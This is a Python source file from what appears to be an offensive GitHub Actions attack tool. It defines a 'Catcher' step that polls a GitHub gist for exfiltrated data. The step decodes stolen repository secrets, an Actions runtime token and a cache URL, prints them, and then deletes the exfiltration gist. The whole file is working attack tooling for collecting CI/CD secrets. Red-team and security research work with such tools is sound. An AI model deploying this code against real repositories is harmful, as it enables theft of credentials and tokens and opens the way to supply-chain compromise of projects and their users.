import time
import base64
import json
import re
from binascii import Error

from json.decoder import JSONDecodeError

from gatox.cli.output import Output
from gatox.attack.pwnrequest.steps.attack_step import AttackStep
from gatox.github.api import Api


class Catcher(AttackStep):
    """Represents a catcher step, which checks a given resource for secrets or other values."""

    # Compile the JWT regex
    jwt_pattern = re.compile(r"\b[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\b")
    cacheurl_pattern = re.compile(
        r"https://[A-Za-z0-9-]+\.[A-Za-z0-9-]+\.githubusercontent\.com/[A-Za-z0-9]+/?"
    )

    def __init__(self, expected_secrets: list, gist_pat: str, timeout: int = 300):
        """ """
        self.secrets = []
        self.cache_token = {}
        self.timeout = None
        self.step_data = f"Catcher - Expected Secrets: {expected_secrets}"
        self.expected_secrets = expected_secrets
        self.gist_pat = gist_pat
        self.timeout = timeout
        self.exfil_gist = None
        self.output = {}

    def __extract_secrets(self, gist_results):
        """Extracts secrets from exfiltration gist."""

        segments = gist_results.split(":")
        if len(segments) == 3:
            try:
                values = base64.b64decode(segments[0]).decode("utf-8")
                cachetoken = base64.b64decode(segments[1]).decode("utf-8")
                cacheurl = base64.b64decode(segments[2]).decode("utf-8")
            except Error as e:
                Output.error("Error decoding exfiltrated secrets!")
                return False

            cachetoken = self.jwt_pattern.findall(cachetoken)
            cacheurl = self.cacheurl_pattern.findall(cacheurl)

            if cachetoken:
                cachetoken = cachetoken[0]
            if cacheurl:
                cacheurl = cacheurl[0]

            segments = values.split("\n")
            secrets = {}

            for segment in segments:
                segment_json = json.loads(f"{{{segment}}}")
                for key, value in segment_json.items():
                    secrets[key] = value["value"]
                    Output.owned(f"Captured secret: {key} -> {value['value']}")

            Output.owned(f"Captured Actions Runtime token: {cachetoken}")
            Output.owned(f"Captured Cache url: {cacheurl}")

            if not all(secret in secrets for secret in self.expected_secrets):
                Output.error(
                    "Not all expected secrets were found, we will not continue!"
                )
                return False

            self.output["secrets"] = {
                "values": secrets,
                "cachetoken": cachetoken,
                "cacheurl": cacheurl,
            }
            return True
        else:
            Output.error("Invalid exfiltration format!")
            return False

    def preflight(self, api, previous_results=None):
        """Validates preconditions for executing this step."""
        # Check if the gist exists
        if previous_results:
            self.catcher_id = previous_results.get("catcher_gist", None)
            self.exfil_gist = previous_results.get("exfil_gist", None)

            if self.catcher_id and self.exfil_gist:
                return True
            else:
                Output.error("No previous results found!")
                return False

    def execute(self, api: Api):
        """Execute the step after validating pre-conditions."""
        # We need to continuously check the exfil gist for the desired secrets.
        Output.info("Checking for exfiltrated secrets!")
        start_time = time.time()
        while time.time() - start_time < self.timeout:
            gist_results = api.get_gist_file(
                self.catcher_id, credential_override=self.gist_pat
            )
            # Process gist_results if needed
            if gist_results:
                status = self.__extract_secrets(gist_results)

                if self.exfil_gist:
                    api.call_delete(
                        f"/gists/{self.exfil_gist}", credential_override=self.gist_pat
                    )

                if status:
                    self.output["status"] = AttackStep.SUCCESS_STATUS
                    return True
                else:
                    self.output["status"] = AttackStep.FAIL_STATUS
                    return False

            time.sleep(3)

        Output.error("Timeout reached while waiting for secrets.")
        return False
